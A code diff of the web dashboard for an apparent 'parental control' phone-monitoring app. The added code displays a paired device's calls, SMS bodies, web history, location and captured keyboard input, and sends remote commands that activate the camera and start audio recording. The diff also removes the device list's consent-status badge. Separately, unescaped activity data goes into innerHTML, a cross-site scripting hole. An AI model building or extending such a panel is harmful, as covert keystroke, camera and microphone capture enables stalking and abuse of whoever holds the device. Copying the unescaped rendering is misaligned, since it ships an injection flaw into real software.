@@ -7,11 +7,44 @@ import { createClient } from 'https://cdn.skypack.dev/@supabase/supabase-js@2';
 
 const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 let currentUser = null;
+let selectedDevice = null;
+let refreshInterval = null;
+
+// Activity type icons and labels
+const ACTIVITY_ICONS = {
+    'call': '📞',
+    'sms': '💬',
+    'app_usage': '📱',
+    'web_activity': '🌐',
+    'location': '📍',
+    'keyboard_input': '⌨️',
+    'camera': '📷',
+    'mic': '🎤',
+    'notification': '🔔',
+    'screen_interaction': '👆',
+    'call_recording': '🎙️',
+    'emergency_alert': '🚨'
+};
+
+const ACTIVITY_LABELS = {
+    'call': 'Phone Call',
+    'sms': 'Text Message',
+    'app_usage': 'App Usage',
+    'web_activity': 'Web Activity',
+    'location': 'Location Update',
+    'keyboard_input': 'Keyboard Input',
+    'camera': 'Camera Usage',
+    'mic': 'Microphone Usage',
+    'notification': 'Notification',
+    'screen_interaction': 'Screen Interaction',
+    'call_recording': 'Call Recording',
+    'emergency_alert': 'Emergency Alert'
+};
 
 // Initialize dashboard
 document.addEventListener('DOMContentLoaded', function() {
     checkAuthState();
-    setInterval(refreshData, 30000); // Refresh every 30 seconds
+    setupEventListeners();
 });
 
 // Authentication state management
@@ -20,103 +53,44 @@ async function checkAuthState() {
     
     if (session) {
         currentUser = session.user;
-        loadDashboard();
+        showDashboard();
+        loadDevices();
+        startAutoRefresh();
     } else {
-        showLogin();
+        showAuth();
     }
+}
+
+function setupEventListeners() {
+    // Enter key listeners for forms
+    document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') login();
+    });
     
-    // Listen for auth changes
-    supabase.auth.onAuthStateChange((event, session) => {
-        if (event === 'SIGNED_IN') {
-            currentUser = session.user;
-            location.reload();
-        } else if (event === 'SIGNED_OUT') {
-            currentUser = null;
-            showLogin();
-        }
+    document.getElementById('registerPassword').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') register();
+    });
+    
+    // Code input navigation
+    const codeInputs = document.querySelectorAll('.code-digit');
+    codeInputs.forEach((input, index) => {
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && index > 0) {
+                codeInputs[index - 1].focus();
+            }
+        });
     });
 }
 
-// Authentication
-function showLogin() {
-    document.body.innerHTML = `
-        <div class="container mt-5">
-            <div class="row justify-content-center">
-                <div class="col-md-6">
-                    <div class="card">
-                        <div class="card-header text-center">
-                            <h4><i class="fas fa-shield-alt"></i> Parental Control Login</h4>
-                        </div>
-                        <div class="card-body">
-                            <form id="loginForm">
-                                <div class="mb-3">
-                                    <label for="email" class="form-label">Email</label>
-                                    <input type="email" class="form-control" id="email" required>
-                                </div>
-                                <div class="mb-3">
-                                    <label for="password" class="form-label">Password</label>
-                                    <input type="password" class="form-control" id="password" required>
-                                </div>
-                                <button type="submit" class="btn btn-primary w-100">Login</button>
-                            </form>
-                            <hr>
-                            <p class="text-center">
-                                <a href="#" onclick="showRegister()">Don't have an account? Register</a>
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    `;
+// Authentication functions
+async function login() {
+    const email = document.getElementById('loginEmail').value;
+    const password = document.getElementById('loginPassword').value;
     
-    document.getElementById('loginForm').addEventListener('submit', login);
-}
-
-function showRegister() {
-    document.body.innerHTML = `
-        <div class="container mt-5">
-            <div class="row justify-content-center">
-                <div class="col-md-6">
-                    <div class="card">
-                        <div class="card-header text-center">
-                            <h4><i class="fas fa-user-plus"></i> Register Parent Account</h4>
-                        </div>
-                        <div class="card-body">
-                            <form id="registerForm">
-                                <div class="mb-3">
-                                    <label for="name" class="form-label">Full Name</label>
-                                    <input type="text" class="form-control" id="name" required>
-                                </div>
-                                <div class="mb-3">
-                                    <label for="email" class="form-label">Email</label>
-                                    <input type="email" class="form-control" id="email" required>
-                                </div>
-                                <div class="mb-3">
-                                    <label for="password" class="form-label">Password</label>
-                                    <input type="password" class="form-control" id="password" required>
-                                </div>
-                                <button type="submit" class="btn btn-primary w-100">Register</button>
-                            </form>
-                            <hr>
-                            <p class="text-center">
-                                <a href="#" onclick="showLogin()">Already have an account? Login</a>
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    `;
-    
-    document.getElementById('registerForm').addEventListener('submit', register);
-}
-
-async function login(e) {
-    e.preventDefault();
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+    if (!email || !password) {
+        showError('Please fill in all fields');
+        return;
+    }
     
     try {
         const { data, error } = await supabase.auth.signInWithPassword({
@@ -125,21 +99,34 @@ async function login(e) {
         });
         
         if (error) {
-            alert('Login failed: ' + error.message);
-        } else {
-            // Success handled by auth state change listener
+            showError(error.message);
+            return;
         }
+        
+        currentUser = data.user;
+        showSuccess('Login successful!');
+        showDashboard();
+        loadDevices();
+        startAutoRefresh();
     } catch (error) {
-        alert('Login error: ' + error.message);
+        showError('Login failed: ' + error.message);
     }
 }
 
-async function register(e) {
-    e.preventDefault();
+async function register() {
+    const name = document.getElementById('registerName').value;
+    const email = document.getElementById('registerEmail').value;
+    const password = document.getElementById('registerPassword').value;
     
-    const name = document.getElementById('name').value;
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+    if (!name || !email || !password) {
+        showError('Please fill in all fields');
+        return;
+    }
+    
+    if (password.length < 6) {
+        showError('Password must be at least 6 characters');
+        return;
+    }
     
     try {
         const { data, error } = await supabase.auth.signUp({
@@ -153,29 +140,66 @@ async function register(e) {
         });
         
         if (error) {
-            alert('Registration failed: ' + error.message);
-        } else {
-            alert('Registration successful! Please check your email to verify your account.');
-            showLogin();
+            showError(error.message);
+            return;
         }
+        
+        showSuccess('Registration successful! Please check your email to verify your account.');
+        showLogin();
     } catch (error) {
-        alert('Registration error: ' + error.message);
+        showError('Registration failed: ' + error.message);
     }
 }
 
 async function logout() {
     await supabase.auth.signOut();
+    currentUser = null;
+    selectedDevice = null;
+    stopAutoRefresh();
+    showAuth();
 }
 
-// Dashboard functions
-async function loadDashboard() {
-    await Promise.all([
-        loadDevices(),
-        loadRecentActivities(),
-        updateStats()
-    ]);
+// UI Navigation
+function showAuth() {
+    document.getElementById('authSection').style.display = 'block';
+    document.getElementById('dashboardSection').style.display = 'none';
 }
 
+function showDashboard() {
+    document.getElementById('authSection').style.display = 'none';
+    document.getElementById('dashboardSection').style.display = 'block';
+    document.getElementById('userEmail').textContent = currentUser?.email || '';
+}
+
+function showLogin() {
+    document.getElementById('loginForm').classList.remove('hidden');
+    document.getElementById('registerForm').classList.add('hidden');
+}
+
+function showRegister() {
+    document.getElementById('loginForm').classList.add('hidden');
+    document.getElementById('registerForm').classList.remove('hidden');
+}
+
+// Tab navigation
+function showTab(tabName) {
+    // Update active tab button
+    document.querySelectorAll('.nav-tabs button').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    event.target.classList.add('active');
+    
+    // Show corresponding tab pane
+    document.querySelectorAll('.tab-pane').forEach(pane => {
+        pane.classList.remove('active');
+    });
+    document.getElementById(tabName).classList.add('active');
+    
+    // Load tab-specific data
+    loadTabData(tabName);
+}
+
+// Device management
 async function loadDevices() {
     try {
         const { data: devices, error } = await supabase
@@ -183,194 +207,764 @@ async function loadDevices() {
             .select('*')
             .eq('parent_id', currentUser.id);
         
-        if (error) throw error;
-        
-        document.getElementById('deviceCount').textContent = devices.length;
-        
-        const devicesList = document.getElementById('devicesList');
-        if (devices.length === 0) {
-            devicesList.innerHTML = '<p class="text-muted">No devices registered yet.</p>';
+        if (error) {
+            console.error('Error loading devices:', error);
             return;
         }
         
-        devicesList.innerHTML = devices.map(device => `
-            <div class="card mb-3">
-                <div class="card-body">
-                    <div class="row align-items-center">
-                        <div class="col">
-                            <h5 class="card-title">
-                                <i class="fas fa-mobile-alt"></i> ${device.device_name}
-                            </h5>
-                            <p class="card-text">
-                                <small class="text-muted">ID: ${device.device_id}</small><br>
-                                <small class="text-muted">Last Active: ${new Date(device.last_active).toLocaleString()}</small>
-                            </p>
-                        </div>
-                        <div class="col-auto">
-                            <span class="badge ${device.consent_granted ? 'bg-success' : 'bg-warning'}">
-                                ${device.consent_granted ? 'Consent Granted' : 'Pending Consent'}
-                            </span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        `).join('');
+        const deviceSelect = document.getElementById('deviceSelect');
+        deviceSelect.innerHTML = '<option value="">Select a device...</option>';
         
+        devices.forEach(device => {
+            const option = document.createElement('option');
+            option.value = device.device_id;
+            option.textContent = `${device.device_name} (${device.device_id})`;
+            deviceSelect.appendChild(option);
+        });
+        
+        // Auto-select first device if available
+        if (devices.length > 0 && !selectedDevice) {
+            selectedDevice = devices[0].device_id;
+            deviceSelect.value = selectedDevice;
+            loadOverviewData();
+        }
     } catch (error) {
         console.error('Error loading devices:', error);
     }
 }
 
-async function loadRecentActivities() {
-    try {
-        const { data: devices, error: devicesError } = await supabase
-            .from('devices')
-            .select('device_id')
-            .eq('parent_id', currentUser.id);
-        
-        if (devicesError) throw devicesError;
-        
-        if (devices.length === 0) {
-            document.getElementById('recentActivities').innerHTML = 
-                '<p class="text-muted">No devices to show activities for.</p>';
-            return;
-        }
-        
-        // Load activities for first device (or all devices)
-        const deviceId = devices[0].device_id;
-        const { data: activities, error } = await supabase
-            .from('activities')
-            .select('*')
-            .eq('device_id', deviceId)
-            .order('timestamp', { ascending: false })
-            .limit(10);
-        
-        if (error) throw error;
-        
-        const activitiesHtml = activities.map(activity => {
-            const icon = getActivityIcon(activity.activity_type);
-            const time = new Date(activity.timestamp).toLocaleString();
-            
-            return `
-                <div class="card activity-card mb-2">
-                    <div class="card-body py-2">
-                        <div class="row align-items-center">
-                            <div class="col-auto">
-                                <i class="${icon}"></i>
-                            </div>
-                            <div class="col">
-                                <strong>${activity.activity_type.toUpperCase()}</strong>
-                                <small class="text-muted d-block">${time}</small>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }).join('');
-        
-        document.getElementById('recentActivities').innerHTML = 
-            activitiesHtml || '<p class="text-muted">No recent activities.</p>';
-            
-    } catch (error) {
-        console.error('Error loading activities:', error);
+function switchDevice() {
+    selectedDevice = document.getElementById('deviceSelect').value;
+    if (selectedDevice) {
+        loadOverviewData();
+        loadTabData(getCurrentTab());
     }
 }
 
-async function updateStats() {
-    try {
-        const { data: devices, error: devicesError } = await supabase
-            .from('devices')
-            .select('device_id')
-            .eq('parent_id', currentUser.id);
-        
-        if (devicesError || devices.length === 0) {
-            return;
-        }
-        
-        const deviceId = devices[0].device_id;
-        const today = new Date();
-        today.setHours(0, 0, 0, 0);
-        
-        const { data: activities, error } = await supabase
-            .from('activities')
-            .select('activity_type')
-            .eq('device_id', deviceId)
-            .gte('timestamp', today.toISOString());
-        
-        if (error) throw error;
-        
-        const stats = activities.reduce((acc, activity) => {
-            acc[activity.activity_type] = (acc[activity.activity_type] || 0) + 1;
-            return acc;
-        }, {});
-        
-        document.getElementById('callCount').textContent = stats.call || 0;
-        document.getElementById('smsCount').textContent = stats.sms || 0;
-        document.getElementById('screenTime').textContent = '4.2h'; // Placeholder
-        
-    } catch (error) {
-        console.error('Error updating stats:', error);
+function getCurrentTab() {
+    const activeTab = document.querySelector('.tab-pane.active');
+    return activeTab ? activeTab.id : 'overview';
+}
+
+// Device pairing
+function moveToNext(input, index) {
+    if (input.value.length === 1 && index < 5) {
+        const nextInput = document.querySelectorAll('.code-digit')[index + 1];
+        if (nextInput) nextInput.focus();
     }
 }
 
-function getActivityIcon(type) {
-    const icons = {
-        'call': 'fas fa-phone text-primary',
-        'sms': 'fas fa-sms text-success',
-        'app_usage': 'fas fa-mobile-alt text-info',
-        'camera': 'fas fa-camera text-warning',
-        'mic': 'fas fa-microphone text-danger'
-    };
-    return icons[type] || 'fas fa-circle text-secondary';
-}
-
-async function addDevice() {
-    const deviceName = document.getElementById('deviceName').value;
-    const pairingCode = document.getElementById('pairingCode').value;
+async function pairDevice() {
+    const codeInputs = document.querySelectorAll('.code-digit');
+    const pairingCode = Array.from(codeInputs).map(input => input.value).join('');
     
-    if (!pairingCode || pairingCode.length !== 6) {
-        alert('Please enter a valid 6-digit pairing code');
+    if (pairingCode.length !== 6) {
+        showError('Please enter the complete 6-digit pairing code');
         return;
     }
     
     try {
-        // Call the pairing function
         const { data, error } = await supabase.rpc('pair_device_with_parent', {
             pairing_code_input: pairingCode,
             parent_user_id: currentUser.id
         });
         
-        if (error) throw error;
+        if (error) {
+            showError('Pairing failed: ' + error.message);
+            return;
+        }
         
         if (data.success) {
-            alert(`Device "${data.device_name}" paired successfully!`);
-            document.getElementById('addDeviceForm').reset();
-            bootstrap.Modal.getInstance(document.getElementById('addDeviceModal')).hide();
+            showSuccess(`Device "${data.device_name}" paired successfully!`);
+            // Clear pairing code inputs
+            codeInputs.forEach(input => input.value = '');
+            // Reload devices
             loadDevices();
         } else {
-            alert('Pairing failed: ' + data.error);
+            showError(data.error || 'Pairing failed');
         }
     } catch (error) {
-        alert('Error pairing device: ' + error.message);
+        showError('Pairing error: ' + error.message);
     }
 }
 
-function showSection(sectionName) {
-    // Hide all sections
-    document.querySelectorAll('.section').forEach(section => {
-        section.style.display = 'none';
-    });
+// Data loading functions
+async function loadOverviewData() {
+    if (!selectedDevice) return;
     
-    // Show selected section
-    document.getElementById(sectionName).style.display = 'block';
-    
-    // Update active nav link
-    document.querySelectorAll('.nav-link').forEach(link => {
-        link.classList.remove('active');
-    });
-    document.querySelector(`[href="#${sectionName}"]`).classList.add('active');
+    try {
+        // Load statistics
+        const { data: stats, error: statsError } = await supabase.rpc('get_device_stats', {
+            device_uuid: selectedDevice
+        });
+        
+        if (!statsError && stats) {
+            document.getElementById('callCount').textContent = stats.callCount || 0;
+            document.getElementById('smsCount').textContent = stats.smsCount || 0;
+            document.getElementById('appCount').textContent = stats.appUsageCount || 0;
+            document.getElementById('webCount').textContent = stats.webActivityCount || 0;
+            document.getElementById('locationCount').textContent = stats.locationCount || 0;
+            document.getElementById('keyboardCount').textContent = stats.keyboardInputCount || 0;
+        }
+        
+        // Load recent activities
+        loadRecentActivities();
+    } catch (error) {
+        console.error('Error loading overview data:', error);
+    }
 }
 
-function refreshData() {
-    loadDashboard();
+async function loadRecentActivities() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .order('timestamp', { ascending: false })
+            .limit(20);
+        
+        if (error) {
+            console.error('Error loading activities:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'recentActivities');
+    } catch (error) {
+        console.error('Error loading recent activities:', error);
+    }
 }
+
+async function loadTabData(tabName) {
+    if (!selectedDevice) return;
+    
+    switch (tabName) {
+        case 'calls':
+            loadCallData();
+            break;
+        case 'messages':
+            loadMessageData();
+            break;
+        case 'apps':
+            loadAppData();
+            break;
+        case 'web':
+            loadWebData();
+            break;
+        case 'location':
+            loadLocationData();
+            break;
+        case 'keyboard':
+            loadKeyboardData();
+            break;
+        case 'media':
+            loadMediaData();
+            break;
+        case 'notifications':
+            loadNotificationData();
+            break;
+        case 'remote':
+            loadRemoteCommandHistory();
+            break;
+    }
+}
+
+async function loadCallData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('activity_type', 'call')
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading call data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'callsList');
+    } catch (error) {
+        console.error('Error loading call data:', error);
+    }
+}
+
+async function loadMessageData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .in('activity_type', ['sms', 'notification'])
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading message data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'messagesList');
+    } catch (error) {
+        console.error('Error loading message data:', error);
+    }
+}
+
+async function loadAppData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('activity_type', 'app_usage')
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading app data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'appsList');
+    } catch (error) {
+        console.error('Error loading app data:', error);
+    }
+}
+
+async function loadWebData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('activity_type', 'web_activity')
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading web data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'webList');
+    } catch (error) {
+        console.error('Error loading web data:', error);
+    }
+}
+
+async function loadLocationData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('activity_type', 'location')
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading location data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'locationList');
+    } catch (error) {
+        console.error('Error loading location data:', error);
+    }
+}
+
+async function loadKeyboardData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('activity_type', 'keyboard_input')
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading keyboard data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'keyboardList');
+    } catch (error) {
+        console.error('Error loading keyboard data:', error);
+    }
+}
+
+async function loadMediaData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .in('activity_type', ['camera', 'mic', 'call_recording'])
+            .order('timestamp', { ascending: false })
+            .limit(30);
+        
+        if (error) {
+            console.error('Error loading media data:', error);
+            return;
+        }
+        
+        displayMediaGallery(activities);
+    } catch (error) {
+        console.error('Error loading media data:', error);
+    }
+}
+
+async function loadNotificationData() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: activities, error } = await supabase
+            .from('activities')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('activity_type', 'notification')
+            .order('timestamp', { ascending: false })
+            .limit(50);
+        
+        if (error) {
+            console.error('Error loading notification data:', error);
+            return;
+        }
+        
+        displayActivities(activities, 'notificationsList');
+    } catch (error) {
+        console.error('Error loading notification data:', error);
+    }
+}
+
+async function loadRemoteCommandHistory() {
+    if (!selectedDevice) return;
+    
+    try {
+        const { data: commands, error } = await supabase
+            .from('remote_commands')
+            .select('*')
+            .eq('device_id', selectedDevice)
+            .eq('parent_id', currentUser.id)
+            .order('created_at', { ascending: false })
+            .limit(20);
+        
+        if (error) {
+            console.error('Error loading remote commands:', error);
+            return;
+        }
+        
+        displayRemoteCommands(commands);
+    } catch (error) {
+        console.error('Error loading remote commands:', error);
+    }
+}
+
+// Display functions
+function displayActivities(activities, containerId) {
+    const container = document.getElementById(containerId);
+    
+    if (!activities || activities.length === 0) {
+        container.innerHTML = `
+            <div class="empty-state">
+                <div class="icon">📭</div>
+                <p>No activities found</p>
+            </div>
+        `;
+        return;
+    }
+    
+    container.innerHTML = activities.map(activity => {
+        const icon = ACTIVITY_ICONS[activity.activity_type] || '📱';
+        const label = ACTIVITY_LABELS[activity.activity_type] || activity.activity_type;
+        const time = new Date(activity.timestamp).toLocaleString();
+        
+        let details = '';
+        if (activity.activity_data) {
+            const data = typeof activity.activity_data === 'string' 
+                ? JSON.parse(activity.activity_data) 
+                : activity.activity_data;
+            
+            switch (activity.activity_type) {
+                case 'call':
+                    details = `${data.type || 'Unknown'} call ${data.number ? 'to/from ' + data.number : ''} - Duration: ${data.duration || 'Unknown'}`;
+                    break;
+                case 'sms':
+                    details = `${data.type || 'Unknown'} message ${data.number ? 'to/from ' + data.number : ''}: ${data.body ? data.body.substring(0, 100) + '...' : ''}`;
+                    break;
+                case 'app_usage':
+                    details = `App: ${data.packageName || data.appName || 'Unknown'} - Usage: ${data.duration || 'Unknown'}`;
+                    break;
+                case 'web_activity':
+                    details = `Website: ${data.url || 'Unknown'} - Title: ${data.title || 'Unknown'}`;
+                    break;
+                case 'location':
+                    details = `Location: ${data.address || `${data.latitude}, ${data.longitude}` || 'Unknown'}`;
+                    break;
+                case 'keyboard_input':
+                    details = `App: ${data.appName || 'Unknown'} - Input: ${data.text ? data.text.substring(0, 50) + '...' : 'Hidden'}`;
+                    break;
+                case 'notification':
+                    details = `App: ${data.appName || 'Unknown'} - ${data.title || ''}: ${data.text || ''}`;
+                    break;
+                default:
+                    details = JSON.stringify(data).substring(0, 100) + '...';
+            }
+        }
+        
+        return `
+            <div class="activity-item">
+                <div class="activity-icon">${icon}</div>
+                <div class="activity-info">
+                    <div class="activity-type">${label}</div>
+                    <div class="activity-details">${details}</div>
+                    <div class="activity-time">${time}</div>
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+function displayMediaGallery(activities) {
+    const container = document.getElementById('mediaGallery');
+    
+    if (!activities || activities.length === 0) {
+        container.innerHTML = `
+            <div class="empty-state">
+                <div class="icon">📷</div>
+                <p>No media files found</p>
+            </div>
+        `;
+        return;
+    }
+    
+    container.innerHTML = activities.map(activity => {
+        const time = new Date(activity.timestamp).toLocaleString();
+        const data = typeof activity.activity_data === 'string' 
+            ? JSON.parse(activity.activity_data) 
+            : activity.activity_data;
+        
+        let mediaHtml = '';
+        if (activity.activity_type === 'camera' && data.imagePath) {
+            mediaHtml = `<img src="${data.imagePath}" alt="Camera capture">`;
+        } else if (activity.activity_type === 'mic' && data.audioPath) {
+            mediaHtml = `<audio controls><source src="${data.audioPath}" type="audio/mpeg"></audio>`;
+        } else {
+            mediaHtml = `<div style="height: 150px; display: flex; align-items: center; justify-content: center; background: #f0f0f0;">
+                ${ACTIVITY_ICONS[activity.activity_type] || '📱'}
+            </div>`;
+        }
+        
+        return `
+            <div class="media-item">
+                ${mediaHtml}
+                <div class="media-info">
+                    <strong>${ACTIVITY_LABELS[activity.activity_type] || activity.activity_type}</strong><br>
+                    <small>${time}</small>
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+function displayRemoteCommands(commands) {
+    const container = document.getElementById('remoteCommandHistory');
+    
+    if (!commands || commands.length === 0) {
+        container.innerHTML = `
+            <div class="empty-state">
+                <div class="icon">🎛️</div>
+                <p>No remote commands found</p>
+            </div>
+        `;
+        return;
+    }
+    
+    container.innerHTML = commands.map(command => {
+        const time = new Date(command.created_at).toLocaleString();
+        const completedTime = command.completed_at ? new Date(command.completed_at).toLocaleString() : null;
+        
+        let statusClass = '';
+        let statusIcon = '';
+        switch (command.status) {
+            case 'completed':
+                statusClass = 'status-active';
+                statusIcon = '✅';
+                break;
+            case 'failed':
+                statusClass = 'status-inactive';
+                statusIcon = '❌';
+                break;
+            default:
+                statusClass = 'status-inactive';
+                statusIcon = '⏳';
+        }
+        
+        return `
+            <div class="activity-item">
+                <div class="activity-icon">${statusIcon}</div>
+                <div class="activity-info">
+                    <div class="activity-type">${command.command_type.replace('_', ' ').toUpperCase()}</div>
+                    <div class="activity-details">
+                        Status: <span class="device-status ${statusClass}">${command.status}</span>
+                        ${command.result ? `<br>Result: ${command.result}` : ''}
+                    </div>
+                    <div class="activity-time">
+                        Sent: ${time}
+                        ${completedTime ? `<br>Completed: ${completedTime}` : ''}
+                    </div>
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+// Remote control functions
+async function activateCamera() {
+    if (!selectedDevice) {
+        showError('Please select a device first');
+        return;
+    }
+    
+    const cameraType = document.getElementById('cameraType').value;
+    
+    try {
+        const { data, error } = await supabase
+            .from('remote_commands')
+            .insert([{
+                device_id: selectedDevice,
+                parent_id: currentUser.id,
+                command_type: 'activate_camera',
+                command_data: { camera_type: cameraType, duration: 30 }
+            }]);
+        
+        if (error) {
+            showError('Failed to send camera command: ' + error.message);
+            return;
+        }
+        
+        showSuccess('Camera activation command sent successfully!');
+        loadRemoteCommandHistory();
+    } catch (error) {
+        showError('Error sending camera command: ' + error.message);
+    }
+}
+
+async function startAudioRecording() {
+    if (!selectedDevice) {
+        showError('Please select a device first');
+        return;
+    }
+    
+    const duration = document.getElementById('audioDuration').value;
+    
+    try {
+        const { data, error } = await supabase
+            .from('remote_commands')
+            .insert([{
+                device_id: selectedDevice,
+                parent_id: currentUser.id,
+                command_type: 'start_audio_monitoring',
+                command_data: { duration: parseInt(duration) }
+            }]);
+        
+        if (error) {
+            showError('Failed to send audio command: ' + error.message);
+            return;
+        }
+        
+        showSuccess('Audio recording command sent successfully!');
+        loadRemoteCommandHistory();
+    } catch (error) {
+        showError('Error sending audio command: ' + error.message);
+    }
+}
+
+async function requestLocation() {
+    if (!selectedDevice) {
+        showError('Please select a device first');
+        return;
+    }
+    
+    try {
+        const { data, error } = await supabase
+            .from('remote_commands')
+            .insert([{
+                device_id: selectedDevice,
+                parent_id: currentUser.id,
+                command_type: 'get_location',
+                command_data: { immediate: true }
+            }]);
+        
+        if (error) {
+            showError('Failed to send location request: ' + error.message);
+            return;
+        }
+        
+        showSuccess('Location request sent successfully!');
+        loadRemoteCommandHistory();
+    } catch (error) {
+        showError('Error sending location request: ' + error.message);
+    }
+}
+
+async function sendEmergencyAlert() {
+    if (!selectedDevice) {
+        showError('Please select a device first');
+        return;
+    }
+    
+    if (!confirm('Send emergency alert to check child safety status?')) {
+        return;
+    }
+    
+    try {
+        const { data, error } = await supabase
+            .from('remote_commands')
+            .insert([{
+                device_id: selectedDevice,
+                parent_id: currentUser.id,
+                command_type: 'emergency_alert',
+                command_data: { priority: 'high', message: 'Parent safety check' }
+            }]);
+        
+        if (error) {
+            showError('Failed to send emergency alert: ' + error.message);
+            return;
+        }
+        
+        showSuccess('Emergency alert sent successfully!');
+        loadRemoteCommandHistory();
+    } catch (error) {
+        showError('Error sending emergency alert: ' + error.message);
+    }
+}
+
+// Filter functions
+function filterCalls() {
+    // Implementation for call filtering
+    loadCallData();
+}
+
+function filterMessages() {
+    // Implementation for message filtering
+    loadMessageData();
+}
+
+function filterApps() {
+    // Implementation for app filtering
+    loadAppData();
+}
+
+function filterWeb() {
+    // Implementation for web filtering
+    loadWebData();
+}
+
+function filterLocation() {
+    // Implementation for location filtering
+    loadLocationData();
+}
+
+function filterKeyboard() {
+    // Implementation for keyboard filtering
+    loadKeyboardData();
+}
+
+function filterMedia() {
+    // Implementation for media filtering
+    loadMediaData();
+}
+
+function filterNotifications() {
+    // Implementation for notification filtering
+    loadNotificationData();
+}
+
+// Auto-refresh functionality
+function startAutoRefresh() {
+    if (refreshInterval) clearInterval(refreshInterval);
+    
+    refreshInterval = setInterval(() => {
+        if (selectedDevice) {
+            loadOverviewData();
+            loadTabData(getCurrentTab());
+        }
+    }, 30000); // Refresh every 30 seconds
+}
+
+function stopAutoRefresh() {
+    if (refreshInterval) {
+        clearInterval(refreshInterval);
+        refreshInterval = null;
+    }
+}
+
+// Utility functions
+function showError(message) {
+    // Remove existing messages
+    document.querySelectorAll('.error, .success').forEach(el => el.remove());
+    
+    const errorDiv = document.createElement('div');
+    errorDiv.className = 'error';
+    errorDiv.textContent = message;
+    
+    const container = document.querySelector('.container');
+    container.insertBefore(errorDiv, container.firstChild);
+    
+    setTimeout(() => errorDiv.remove(), 5000);
+}
+
+function showSuccess(message) {
+    // Remove existing messages
+    document.querySelectorAll('.error, .success').forEach(el => el.remove());
+    
+    const successDiv = document.createElement('div');
+    successDiv.className = 'success';
+    successDiv.textContent = message;
+    
+    const container = document.querySelector('.container');
+    container.insertBefore(successDiv, container.firstChild);
+    
+    setTimeout(() => successDiv.remove(), 5000);
+}
+
+// Export functions for global access
+window.login = login;
+window.register = register;
+window.logout = logout;
+window.showLogin = showLogin;
+window.showRegister = showRegister;
+window.showTab = showTab;
+window.switchDevice = switchDevice;
+window.moveToNext = moveToNext;
+window.pairDevice = pairDevice;
+window.activateCamera = activateCamera;
+window.startAudioRecording = startAudioRecording;
+window.requestLocation = requestLocation;
+window.sendEmergencyAlert = sendEmergencyAlert;
+window.filterCalls = filterCalls;
+window.filterMessages = filterMessages;
+window.filterApps = filterApps;
+window.filterWeb = filterWeb;
+window.filterLocation = filterLocation;
+window.filterKeyboard = filterKeyboard;
+window.filterMedia = filterMedia;
+window.filterNotifications = filterNotifications;
